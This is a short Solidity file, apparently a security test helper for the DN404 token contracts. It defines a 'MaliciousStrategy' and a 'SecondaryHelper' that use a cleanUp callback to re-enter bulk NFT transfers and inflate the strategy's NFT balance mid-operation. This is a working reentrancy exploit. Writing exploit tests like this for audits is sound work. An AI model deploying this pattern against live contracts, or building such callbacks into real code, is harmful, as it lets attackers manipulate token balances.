// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.4;

import "../../../src/DN404.sol";
import "../../../src/DN404Mirror.sol";

interface IStrategy {
    function manage(address from, uint256 id) external;
    function cleanUp(address to, uint256 id) external;
}

contract MaliciousStrategy is IStrategy {

    DN404 public dn;
    uint256[] ids;
    DN404Mirror mirror;
    SecondaryHelper helper;
    bool mutex;
    uint256 nftBulkCount;

    constructor(DN404 dn_) {
        dn = dn_;
        dn.setSkipNFT(false);
        mirror = DN404Mirror(payable(dn.mirrorERC721()));
    }

    function setHelper(SecondaryHelper helper_) external {
        helper = helper_;
    }

    function manage(address from, uint256 id) external {
        ids.push(id);
    }

    function cleanUp(address to, uint256 id) external {
        // skip if already working
        if (mutex) return;
        uint256 firstId = ids[0];

        // if we are at the end of the bulk transfers, we can have fun        
        if (id == firstId) {
            // set action in progress so that we skip this logic in the future
            mutex = true;
            
            // this increases the current strategy NFT balance
            helper.doTransfer();
        }
    }
}

contract SecondaryHelper {
    DN404 dn;
    uint256[] ids;
    DN404Mirror mirror;
    MaliciousStrategy strategy;

    constructor(MaliciousStrategy strategy_) {
        strategy = strategy_;
        dn = strategy_.dn();
        dn.setSkipNFT(false);
        mirror = DN404Mirror(payable(dn.mirrorERC721()));
    }

    function setIds(uint256 id) external {
        ids.push(id);
    }

    function doTransfer() external {
        if (msg.sender != address(strategy)) revert("No.");
        for (uint256 i = 0; i < ids.length; i++ ) {
            mirror.transferFrom(address(this), address(strategy), ids[i]);
        }
    }
}

